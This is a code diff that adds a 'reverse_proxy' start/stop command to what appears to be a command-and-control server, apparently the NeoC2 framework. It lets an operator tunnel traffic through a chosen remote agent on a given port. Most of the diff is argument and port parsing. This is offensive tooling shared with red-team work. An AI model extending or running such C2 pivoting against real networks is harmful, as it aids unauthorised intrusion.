@@ -6272,6 +6272,72 @@ DB Inactive:       {stats['db_inactive_agents']}
                             result, status = f"Unknown event action: {action}. Use: list, search, stats, monitor, stop_monitor", 'error'
                     except Exception as e:
                         result, status = f"Error retrieving events: {str(e)}", 'error'
+            elif base_cmd == 'reverse_proxy':
+                if len(command_parts) < 2:
+                    result = "Usage: reverse_proxy <start|stop> [agent_id] [port]"
+                    status = 'error'
+                else:
+                    action = command_parts[1].lower()
+                    agent_id = None
+                    port = 5555  # Default port
+
+                    # Look for agent_id in command parts
+                    for i, part in enumerate(command_parts[2:], 2):
+                        if not part.startswith('-') and '=' not in part:
+                            if self.agent_manager.get_agent(part):  # Check if this looks like an agent ID
+                                agent_id = part
+                                # Check if there's a port specified after the agent ID
+                                if i + 1 < len(command_parts):
+                                    try:
+                                        port = int(command_parts[i + 1])
+                                        if not (1 <= port <= 65535):
+                                            result = f"Port must be between 1 and 65535, got: {port}"
+                                            status = 'error'
+                                            return {'output': result, 'status': status}
+                                    except ValueError:
+                                        pass  # Not a valid port number
+                                break
+                        elif '=' in part:
+                            key, value = part.split('=', 1)
+                            if key == 'agent_id':
+                                agent_id = value
+                            elif key == 'port':
+                                try:
+                                    port = int(value)
+                                    if not (1 <= port <= 65535):
+                                        result = f"Port must be between 1 and 65535, got: {port}"
+                                        status = 'error'
+                                        return {'output': result, 'status': status}
+                                except ValueError:
+                                    result = f"Invalid port number: {value}"
+                                    status = 'error'
+                                    return {'output': result, 'status': status}
+
+                    if not agent_id and remote_session.current_agent:
+                        agent_id = remote_session.current_agent
+
+                    if not agent_id:
+                        result = "No agent specified and no current agent in interactive mode"
+                        status = 'error'
+                        return {'output': result, 'status': status}
+
+                    if action == 'start':
+                        if self.agent_manager.start_reverse_proxy(agent_id, port):
+                            result = f"[+] Reverse proxy started for agent {agent_id} on port {port}"
+                            status = 'success'
+                        else:
+                            result = f"[-] Failed to start reverse proxy for agent {agent_id}"
+                            status = 'error'
+                    elif action == 'stop':
+                        if self.agent_manager.stop_reverse_proxy(agent_id):
+                            result = f"[+] Reverse proxy stopped for agent {agent_id}"
+                            status = 'success'
+                        else:
+                            result = f"[-] Failed to stop reverse proxy for agent {agent_id}"
+                            status = 'error'
+                    else:
+                        result = f"Unknown reverse_proxy action: {action}. Use: start, stop"
+                        status = 'error'
             else:
                 result, status = self.handle_neoc2_command(command, remote_session)
             
